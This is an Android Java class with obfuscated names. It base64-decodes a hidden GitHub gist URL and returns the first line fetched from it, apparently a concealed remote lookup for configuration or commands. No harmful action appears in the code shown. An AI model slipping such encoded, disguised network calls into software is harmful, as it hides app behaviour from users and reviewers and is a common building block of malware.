package com.giflsd.dsadsad.hiddenparadise.wew.fdk;

import android.os.Build;

import androidx.annotation.RequiresApi;

import com.giflsd.dsadsad.hiddenparadise.MMMMM;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Cdd {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String cdd() throws Exception{

        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(MMMMM.decooo("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzFiM2E0ZTMzNmU3YmY4NjdhMmJjNTEwOTIyMmQ1ODcxL3Jhdy9IaWRkZW5fUGFyYWRpc2U=")).openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
        String lddls = bufferedReader.readLine();
        return lddls;
    }
}
